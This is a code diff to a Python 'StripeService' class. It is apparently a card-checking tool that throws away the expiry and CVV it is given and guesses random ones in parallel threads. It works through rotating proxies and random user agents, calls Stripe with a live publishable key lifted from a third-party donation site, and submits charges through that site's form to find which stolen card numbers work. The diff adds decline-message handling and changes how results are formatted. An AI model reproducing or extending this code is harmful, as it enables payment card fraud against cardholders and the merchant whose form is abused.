@@ -9,18 +9,43 @@ class StripeService:
     def __init__(self, proxy_manager: ProxyManager, user_agent: str = None):
         self.proxy_manager = proxy_manager
         self.user_agent = user_agent or UserAgent().random
-        self.max_retries = 7  # Increased to 7 fast retries
-        self.timeout = 5  # Reduced timeout for faster response
+        self.max_retries = 7
+        self.timeout = 5
+
+    def analyze_error(self, response_text: str) -> str:
+        """Analyze the error response and provide detailed information"""
+        error_messages = {
+            "do_not_honor": (
+                "❌ **Do Not Honor Error**\n\n"
+                "**Possible Reasons:**\n"
+                "• Insufficient funds in account\n"
+                "• Bank blocked transaction\n"
+                "• Card restrictions active\n"
+                "• Daily limit exceeded\n"
+                "• International transactions blocked\n\n"
+                "**Solutions:**\n"
+                "1. Check account balance\n"
+                "2. Contact bank for verification\n"
+                "3. Try different card\n"
+                "4. Check card restrictions"
+            ),
+            "insufficient_funds": "❌ **Insufficient Funds**\nCard has insufficient balance.",
+            "expired_card": "❌ **Card Expired**\nPlease use a valid card.",
+            "invalid_cvc": "❌ **Invalid CVV**\nThe security code is incorrect.",
+            "card_declined": "❌ **Card Declined**\nTransaction was declined by the bank.",
+            "processing_error": "❌ **Processing Error**\nTemporary issue with the payment system."
+        }
+
+        response_lower = response_text.lower()
+        for key, message in error_messages.items():
+            if key in response_lower:
+                return message
+        return "❌ **Unknown Error**\nTransaction could not be processed."
 
     def generate_variations(self) -> List[Tuple[str, str, str]]:
-        """Generate variations of CVV and expiry dates"""
         variations = []
-        # Generate random CVVs
         cvvs = [f"{random.randint(0, 999):03d}" for _ in range(7)]
-        
-        # Current month variations
-        current_month = "03"  # Example current month
-        months = [current_month, "01", "02", "03", "04", "05", "06"]
+        months = ["01", "02", "03", "04", "05", "06"]
         years = ["24", "25", "26", "27", "28"]
         
         for cvv in cvvs:
@@ -31,11 +56,19 @@ class StripeService:
         return variations
 
     def try_single_variation(self, cc: str, variation: Tuple[str, str, str], proxy: dict) -> Optional[str]:
-        """Try a single variation of CVV and expiry date"""
         try:
             cvv, mm, yy = variation
             session = requests.Session()
             session.proxies.update(proxy)
+
+            headers = {
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': self.user_agent
+            }
 
             data = {
                 'type': 'card',
@@ -53,15 +86,6 @@ class StripeService:
                 'key': 'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
             }
 
-            headers = {
-                'accept': 'application/json',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'user-agent': self.user_agent,
-            }
-
             response = session.post(
                 'https://api.stripe.com/v1/payment_methods',
                 headers=headers,
@@ -71,13 +95,21 @@ class StripeService:
 
             if response.ok and 'id' in response.json():
                 return f"{response.json()['id']}|{cvv}|{mm}|{yy}"
+            
+            # Check for specific error messages
+            if 'error' in response.json():
+                error_msg = response.json()['error'].get('message', '').lower()
+                if 'do not honor' in error_msg:
+                    return 'do_not_honor'
             return None
 
         except Exception:
             return None
 
     def process_payment(self, stripe_data: str, proxy: dict) -> Optional[str]:
-        """Process payment with the obtained stripe ID"""
+        if stripe_data == 'do_not_honor':
+            return self.analyze_error('do_not_honor')
+
         try:
             stripe_id, cvv, mm, yy = stripe_data.split("|")
             session = requests.Session()
@@ -89,7 +121,7 @@ class StripeService:
                 'origin': 'https://lumivoce.org',
                 'referer': 'https://lumivoce.org/?ff_landing=4&form=gutterspayment',
                 'x-requested-with': 'XMLHttpRequest',
-                'user-agent': self.user_agent,
+                'user-agent': self.user_agent
             }
 
             params = {'t': '1718807439228'}
@@ -111,42 +143,42 @@ class StripeService:
                 timeout=self.timeout
             )
 
-            if response.ok:
-                return f"CVV: {cvv} | MM/YY: {mm}/{yy} | Response: {response.text}"
-            return None
+            if 'do not honor' in response.text.lower():
+                return self.analyze_error('do_not_honor')
 
-        except Exception:
-            return None
+            return f"💳 **Card:** {cc}|{mm}|{yy}|{cvv}\n✨ **Response:** {response.text}"
+
+        except Exception as e:
+            return f"❌ **Error:** {str(e)}"
 
     def check_card(self, card: str) -> str:
         try:
-            cc, _, _, _ = card.split("|")  # Only use the card number, ignore provided mm/yy/cvv
+            cc, _, _, _ = card.split("|")
             proxy = self.proxy_manager.get_random_proxy()
             if not proxy:
                 return "❌ **Error:** No proxies available"
 
-            # Generate variations for parallel processing
             variations = self.generate_variations()
-            successful_result = None
+            results = []
 
             with ThreadPoolExecutor(max_workers=self.max_retries) as executor:
-                # Submit all variations in parallel
                 future_to_variation = {
                     executor.submit(self.try_single_variation, cc, variation, proxy): variation 
                     for variation in variations
                 }
 
-                # Process results as they complete
                 for future in as_completed(future_to_variation):
-                    stripe_data = future.result()
-                    if stripe_data:
-                        # If we get a successful stripe ID, process the payment
-                        payment_result = self.process_payment(stripe_data, proxy)
+                    result = future.result()
+                    if result:
+                        if result == 'do_not_honor':
+                            return self.analyze_error('do_not_honor')
+                        payment_result = self.process_payment(result, proxy)
                         if payment_result:
-                            successful_result = f"✅ **Success!**\n{payment_result}"
-                            break
+                            results.append(payment_result)
 
-            return successful_result or "❌ **Error:** All attempts failed - Wrong CVV/Expiry"
+            if results:
+                return results[0]  # Return the first successful result
+            return self.analyze_error('card_declined')  # Default error if all attempts fail
 
         except Exception as e:
             return f"❌ **Error:** {str(e)}"
